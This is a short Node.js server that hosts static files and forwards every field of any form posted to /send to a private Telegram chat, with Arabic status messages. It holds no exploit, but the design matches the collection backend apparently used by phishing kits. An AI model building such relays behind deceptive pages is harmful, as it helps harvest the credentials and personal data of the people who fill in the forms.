require('dotenv').config();
const express = require('express');
const { Telegraf } = require('telegraf');

const app = express();
const bot = new Telegraf(process.env.bott);
const chatId = process.env.A;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

bot.start((ctx) => ctx.reply('البوت يعمل بنجاح!'));

app.post('/send', (req, res) => {
    let msg = '📥 بيانات جديدة:\n\n';
    for (const [key, val] of Object.entries(req.body)) {
        msg += `${key}: ${val}\n`;
    }
    bot.telegram.sendMessage(chatId, msg);
    res.send('OK');
});

bot.launch();
app.listen(process.env.PORT || 3000);

